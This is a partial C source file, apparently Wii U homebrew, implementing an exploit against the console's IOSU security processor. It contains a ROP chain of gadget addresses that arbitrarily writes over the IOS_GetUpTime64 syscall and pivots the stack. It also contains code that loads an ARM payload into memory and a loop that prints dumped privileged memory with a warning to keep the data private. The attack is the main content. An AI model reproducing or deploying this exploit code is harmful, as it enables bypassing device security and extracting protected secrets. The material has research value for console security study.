...
int final_chain[] = {
   ...
   0x0812A314 + 0x00, // 0x48      address: the beginning of syscall_0x1a (IOS_GetUpTime64)
   0xE92DC010,        // 0x4C      value: PUSH {R4,LR,PC}
   0x0,               // 0x50
   ...
   0x0812A314 + 0x04, // 0x7C      address: the beginning of syscall_0x1a (IOS_GetUpTime64)
   ...
   0x0812A314 + 0x08, // 0xB0      address: the beginning of syscall_0x1a (IOS_GetUpTime64)
   ...
   0x0812A314 + 0x0C, // 0xE4      address: the beginning of syscall_0x1a (IOS_GetUpTime64)
   ...
   0x0812A314 + 0x10, // 0x118     address: the beginning of syscall_0x1a (IOS_GetUpTime64)
   ...
   0x0812A314 + 0x14, // 0x14C     address: the beginning of syscall_0x1a (IOS_GetUpTime64)
   ...
   0x0,               // 0x178
   0x10123a9f,        // 0x148     POP {R0,R1,R4,PC}
   0x0812A314 + 0x18, // 0x14C     address: the beginning of syscall_0x1a (IOS_GetUpTime64)
   0xE1A0F004,        // 0x150     value: MOV PC, R4
   0x0,               // 0x154
   0x10123a8b,        // 0x158     POP {R3,R4,PC}
   0x1,               // 0x15C     R3 must be 1 for the arbitrary write
   0x0,               // 0x160
   ...
   0x0,               // 0x178
   0x10123a9f,        // 0x148     POP {R0,R1,R4,PC}
   0x0812A314 + 0x1C, // 0x14C     address: the beginning of syscall_0x1a (IOS_GetUpTime64)
   ...
   0x0,               // 0x178
   0x10123a9f,        // 0x148     POP {R0,R1,R4,PC}
   0x0812A314 + 0x20, // 0x14C     address: the beginning of syscall_0x1a (IOS_GetUpTime64)
   ...
   0x0,               // 0x178
   0x10123a9f,        // 0x148     POP {R0,R1,R4,PC}
   0x0812A314 + 0x24, // 0x14C     address: the beginning of syscall_0x1a (IOS_GetUpTime64)
   ...
   0x0812A314 + 0x28, // 0x180     address: the beginning of syscall_0x1a (IOS_GetUpTime64)
   ...
   0x0,               // 0x1AC
   0x10123a9f,        // 0x17C     POP {R0,R1,R4,PC}
   0x0812A314 + 0x2C, // 0x180     address: the beginning of syscall_0x1a (IOS_GetUpTime64)
   0xE8BDC010,        // 0x184     value: POP {R4,LR,PC}
   0x0,               // 0x188
   0x10123a8b,        // 0x18C     POP {R3,R4,PC}
   0x1,               // 0x190     R3 must be 1 for the arbitrary write
   0x0,               // 0x194
   ...
   0x0812A314 + 0x30, // 0x1B4     address: the beginning of syscall_0x1a (IOS_GetUpTime64)
   ...
   0x0812A314,        // 0x1DC     start of syscall IOS_GetUpTime64
   ...
   0x0,               // 0x1F8
   sizeof(arm_bin),   // 0x1FC     our code size
   0x0,               // 0x200
   ...
   0x0,               // 0x210
   0x0,               // 0x214
   0x1012EB8C,        // 0x218     IOS_GetUpTime64 (privileged stack pivot) (ends in LDMFD SP!, {R0-R3,PC})
};
...
int threadCallback(int argc, void *arg)
{
    char textBuf[255];
    usleep(900000);
    ...
    while(1)
    {
        DCInvalidateRange((void*)0xF412F000, 0x80);

        OSScreenClearBufferEx(0, 0xFF0000FF);
        OSScreenClearBufferEx(1, 0xFF0000FF);

        int screenPos = -1;
        sprintf(textBuf, "Vote for me! Greetings from wiiubru team!");
        OSScreenPutFontEx(0, -3, screenPos, textBuf);
        OSScreenPutFontEx(1, -3, screenPos, textBuf);
        screenPos++;

        sprintf(textBuf, "DON'T GIVE THIS DATA TO ANYONE!");
        OSScreenPutFontEx(0, -3, screenPos, textBuf);
        OSScreenPutFontEx(1, -3, screenPos, textBuf);
        screenPos++;
        ...
        for(idx = 0; idx < 0x400;)
        {
            ...
            for(n = 0; n < 11; n++)
            {
                ...
                ptr += sprintf(ptr, "%08X ", *(volatile u32*)(0xF412F000 + idx));
                idx += 4;
            }
...
int Menu_Main(void) {
   ...
   InitSocketFunctionPointers();                  //! Init coreinit functions adresses
    ...
    OSScreenSetBufferEx(0, (void *)0xF4150000);
    OSScreenSetBufferEx(1, (void *)(0xF4150000 + screen_buf0_size));
    ...
    //! allocate the stack
    u8 *pThreadStack = (u8 *) memalign(0x20, 0x8000);
    OSCreateThread(pThread, threadCallback, 0, 0, (u32)pThreadStack+0x8000, 0x8000, 0x0, 0x1A);
...
void uhs_exploit_init() {
   ...
   memcpy((char*)(0xF4140000), arm_bin, sizeof(arm_bin));
   ...
   DCFlushRange((void*)0xF4140000, sizeof(arm_bin));      //! |Make CPU fetch new data (with updated vals)
   DCInvalidateRange((void*)0xF4140000, sizeof(arm_bin));   //! |for final chain inside MEM1
}
